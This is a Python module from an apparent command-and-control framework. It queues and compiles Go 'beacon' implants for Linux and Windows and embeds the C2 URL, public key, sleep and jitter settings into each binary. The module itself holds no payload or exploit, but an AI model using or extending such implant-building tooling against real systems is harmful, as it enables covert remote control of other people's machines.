from __future__ import annotations

import hashlib
import io
import json
import os
import re
import shutil
import subprocess
import tarfile
import uuid
from dataclasses import dataclass
from pathlib import Path

from sqlalchemy import select
from sqlalchemy.orm import Session
from xero_common.database import session_factory_for_settings
from xero_common.models import utc_now

from xero_c2.models import BeaconBuild
from xero_c2.schemas import BeaconBuildCreateRequest

BUILD_STATUS_QUEUED = "queued"
BUILD_STATUS_BUILDING = "building"
BUILD_STATUS_SUCCEEDED = "succeeded"
BUILD_STATUS_FAILED = "failed"

SUPPORTED_TARGETS = (
    {"os": "linux", "arch": "amd64", "extension": ".bin", "label": "Linux amd64"},
    {"os": "windows", "arch": "amd64", "extension": ".exe", "label": "Windows amd64"},
)


@dataclass(frozen=True)
class BuildArtifact:
    filename: str
    content: bytes
    logs_tail: str


def public_beacon_build(build: BeaconBuild) -> dict:
    return {
        "id": str(build.id),
        "target_os": build.target_os,
        "target_arch": build.target_arch,
        "status": build.status,
        "profile_name": build.profile_name,
        "config": build.config or {},
        "artifact_filename": artifact_download_filename(build),
        "artifact_sha256": build.artifact_sha256,
        "artifact_size": build.artifact_size,
        "artifact_available": artifact_available(build),
        "logs_tail": build.logs_tail,
        "error_message": build.error_message,
        "created_at": build.created_at.isoformat(),
        "updated_at": build.updated_at.isoformat(),
        "started_at": build.started_at.isoformat() if build.started_at else None,
        "completed_at": build.completed_at.isoformat() if build.completed_at else None,
    }


def artifact_available(build: BeaconBuild) -> bool:
    return bool(build.artifact_path and Path(build.artifact_path).is_file())


def artifact_extension(target_os: str) -> str:
    return ".exe" if target_os == "windows" else ".bin"


def ensure_artifact_extension(filename: str, target_os: str) -> str:
    extension = artifact_extension(target_os)
    return filename if filename.lower().endswith(extension) else f"{filename}{extension}"


def artifact_download_filename(build: BeaconBuild) -> str | None:
    filename = build.artifact_filename
    if not filename and build.artifact_path:
        filename = Path(build.artifact_path).name
    if not filename:
        return None
    return ensure_artifact_extension(filename, build.target_os)


def build_config(payload: BeaconBuildCreateRequest, *, c2_public_key_b64: str) -> dict:
    return {
        "c2_url": payload.c2_url,
        "c2_public_key_b64": c2_public_key_b64,
        "profile_name": payload.profile_name,
        "sleep_seconds": payload.sleep_seconds,
        "jitter": payload.jitter,
        "user_agent": payload.user_agent or "xero-go-beacon/0.1",
        "transport": "auto",
        "fallback_longpoll_enabled": payload.fallback_longpoll_enabled,
        "output_limit_bytes": payload.output_limit_bytes,
        "config_mode": payload.config_mode,
    }


def create_beacon_build(
    session: Session,
    payload: BeaconBuildCreateRequest,
    *,
    c2_public_key_b64: str,
) -> BeaconBuild:
    build = BeaconBuild(
        target_os=payload.target_os,
        target_arch=payload.target_arch,
        status=BUILD_STATUS_QUEUED,
        profile_name=payload.profile_name,
        config=build_config(payload, c2_public_key_b64=c2_public_key_b64),
    )
    session.add(build)
    session.flush()
    build.artifact_filename = artifact_filename(build, payload.output_name)
    return build


def artifact_root(settings) -> Path:
    root = Path(settings.beacon_build_artifact_dir)
    if not root.is_absolute():
        root = Path.cwd() / root
    root.mkdir(parents=True, exist_ok=True)
    return root


def artifact_filename(build: BeaconBuild, output_name: str | None = None) -> str:
    base = output_name or f"xero-beacon-{build.target_os}-{build.target_arch}-{str(build.id)[:8]}"
    safe_base = re.sub(r"[^A-Za-z0-9_.-]+", "-", base).strip(".-") or "xero-beacon"
    return ensure_artifact_extension(safe_base, build.target_os)


def fake_build_artifact(build: BeaconBuild, filename: str) -> BuildArtifact:
    content = json.dumps(
        {
            "build_id": str(build.id),
            "target": f"{build.target_os}/{build.target_arch}",
            "config": build.config,
            "note": "test fake beacon artifact",
        },
        sort_keys=True,
    ).encode("utf-8")
    return BuildArtifact(filename=filename, content=content, logs_tail="fake builder completed")


def complete_build(session: Session, settings, build: BeaconBuild, artifact: BuildArtifact) -> BeaconBuild:
    destination = artifact_root(settings) / artifact.filename
    destination.write_bytes(artifact.content)
    digest = hashlib.sha256(artifact.content).hexdigest()
    build.status = BUILD_STATUS_SUCCEEDED
    build.artifact_path = str(destination)
    build.artifact_filename = artifact.filename
    build.artifact_sha256 = digest
    build.artifact_size = len(artifact.content)
    build.logs_tail = artifact.logs_tail[-4096:]
    build.error_message = None
    build.completed_at = utc_now()
    session.add(build)
    session.flush()
    return build


def fail_build(session: Session, build: BeaconBuild, message: str, logs: str = "") -> BeaconBuild:
    build.status = BUILD_STATUS_FAILED
    build.error_message = message[:1024]
    build.logs_tail = logs[-4096:] if logs else None
    build.completed_at = utc_now()
    session.add(build)
    session.flush()
    return build


def mark_building(session: Session, build: BeaconBuild) -> BeaconBuild:
    build.status = BUILD_STATUS_BUILDING
    build.started_at = utc_now()
    build.error_message = None
    session.add(build)
    session.flush()
    return build


def platform_root_from_settings(settings) -> Path:
    configured = Path(settings.provisioning_platform_root)
    if configured.exists():
        return configured
    return Path(__file__).resolve().parents[3]


def ldflags_for_config(config: dict) -> str:
    parts = []
    mapping = {
        "CompiledC2URL": config.get("c2_url"),
        "CompiledC2PublicKeyB64": config.get("c2_public_key_b64"),
        "CompiledProfileName": config.get("profile_name"),
        "CompiledSleepSeconds": str(config.get("sleep_seconds", "")),
        "CompiledJitter": str(config.get("jitter", "")),
        "CompiledTransport": config.get("transport"),
        "CompiledFallbackLongPoll": str(config.get("fallback_longpoll_enabled", "")).lower(),
        "CompiledOutputLimitBytes": str(config.get("output_limit_bytes", "")),
    }
    for name, value in mapping.items():
        if value not in (None, ""):
            escaped = str(value).replace("'", "")
            parts.append(f"-X 'xero-beacon/internal/config.{name}={escaped}'")
    return " ".join(parts)


def run_command(
    args: list[str],
    *,
    cwd: Path | None = None,
    env: dict[str, str] | None = None,
    stdin: bytes | None = None,
    timeout: int = 180,
) -> subprocess.CompletedProcess:
    return subprocess.run(
        args,
        cwd=cwd,
        env=env,
        input=stdin,
        capture_output=True,
        check=False,
        timeout=timeout,
    )


def local_go_artifact(settings, build: BeaconBuild, filename: str) -> BuildArtifact | None:
    go_bin = shutil.which("go")
    if not go_bin:
        return None
    platform_root = platform_root_from_settings(settings)
    beacon_root = platform_root / "beacons" / "go"
    output_path = artifact_root(settings) / f".tmp-{uuid.uuid4()}-{filename}"
    env = os.environ.copy()
    env.update({"GOOS": build.target_os, "GOARCH": build.target_arch, "CGO_ENABLED": "0"})
    command = [
        go_bin,
        "build",
        "-trimpath",
        "-ldflags",
        ldflags_for_config(build.config or {}),
        "-o",
        str(output_path),
        ".",
    ]
    completed = run_command(command, cwd=beacon_root, env=env, timeout=settings.beacon_build_timeout_seconds)
    logs = (completed.stdout + completed.stderr).decode("utf-8", errors="replace")
    if completed.returncode != 0:
        raise RuntimeError(logs or "Go build failed")
    content = output_path.read_bytes()
    output_path.unlink(missing_ok=True)
    return BuildArtifact(filename=filename, content=content, logs_tail=logs or "local go build completed")


def add_tree_to_tar(tar: tarfile.TarFile, source: Path, arc_prefix: str) -> None:
    for path in source.rglob("*"):
        arcname = f"{arc_prefix}/{path.relative_to(source).as_posix()}"
        tar.add(path, arcname=arcname)


def source_tarball(settings) -> bytes:
    platform_root = platform_root_from_settings(settings)
    payload = io.BytesIO()
    with tarfile.open(fileobj=payload, mode="w:gz") as tar:
        add_tree_to_tar(tar, platform_root / "beacons" / "go", "beacons/go")
        add_tree_to_tar(tar, platform_root / "protocol" / "go", "protocol/go")
    return payload.getvalue()


def docker_go_artifact(settings, build: BeaconBuild, filename: str) -> BuildArtifact:
    docker_bin = shutil.which("docker")
    if not docker_bin:
        raise RuntimeError("Go toolchain and Docker fallback are unavailable")
    volume = f"xero-beacon-build-{build.id}"
    run_command([docker_bin, "volume", "create", volume], timeout=30)
    try:
        upload = run_command(
            [
                docker_bin,
                "run",
                "--rm",
                "-i",
                "-v",
                f"{volume}:/workspace",
                settings.beacon_build_go_image,
                "tar",
                "-xzf",
                "-",
                "-C",
                "/workspace",
            ],
            stdin=source_tarball(settings),
            timeout=settings.beacon_build_timeout_seconds,
        )
        if upload.returncode != 0:
            raise RuntimeError((upload.stdout + upload.stderr).decode("utf-8", errors="replace"))
        build_script = (
            "mkdir -p /workspace/out && "
            "go test ./... && "
            f"CGO_ENABLED=0 GOOS={build.target_os} GOARCH={build.target_arch} "
            f"go build -trimpath -ldflags \"{ldflags_for_config(build.config or {})}\" "
            f"-o /workspace/out/{filename} ."
        )
        completed = run_command(
            [
                docker_bin,
                "run",
                "--rm",
                "-v",
                f"{volume}:/workspace",
                "-w",
                "/workspace/beacons/go",
                settings.beacon_build_go_image,
                "sh",
                "-c",
                build_script,
            ],
            timeout=settings.beacon_build_timeout_seconds,
        )
        logs = (completed.stdout + completed.stderr).decode("utf-8", errors="replace")
        if completed.returncode != 0:
            raise RuntimeError(logs or "Docker Go build failed")
        artifact = run_command(
            [
                docker_bin,
                "run",
                "--rm",
                "-v",
                f"{volume}:/workspace",
                settings.beacon_build_go_image,
                "cat",
                f"/workspace/out/{filename}",
            ],
            timeout=settings.beacon_build_timeout_seconds,
        )
        if artifact.returncode != 0:
            raise RuntimeError((artifact.stdout + artifact.stderr).decode("utf-8", errors="replace"))
        return BuildArtifact(filename=filename, content=artifact.stdout, logs_tail=logs or "docker go build completed")
    finally:
        run_command([docker_bin, "volume", "rm", "-f", volume], timeout=30)


def build_artifact(settings, build: BeaconBuild, filename: str) -> BuildArtifact:
    local = local_go_artifact(settings, build, filename)
    if local is not None:
        return local
    return docker_go_artifact(settings, build, filename)


def run_fake_build(session: Session, settings, build: BeaconBuild, *, output_name: str | None = None) -> BeaconBuild:
    mark_building(session, build)
    filename = artifact_filename(build, output_name)
    return complete_build(session, settings, build, fake_build_artifact(build, filename))


def run_build_job(settings, build_id: uuid.UUID, *, output_name: str | None = None) -> None:
    SessionFactory = session_factory_for_settings(settings)
    with SessionFactory() as session:
        build = session.get(BeaconBuild, build_id)
        if build is None:
            return
        mark_building(session, build)
        session.commit()
        try:
            filename = artifact_filename(build, output_name)
            artifact = build_artifact(settings, build, filename)
            complete_build(session, settings, build, artifact)
        except Exception as exc:
            fail_build(session, build, str(exc))
        session.commit()


def recent_builds(session: Session, limit: int = 25) -> list[BeaconBuild]:
    return list(session.execute(select(BeaconBuild).order_by(BeaconBuild.created_at.desc()).limit(limit)).scalars())
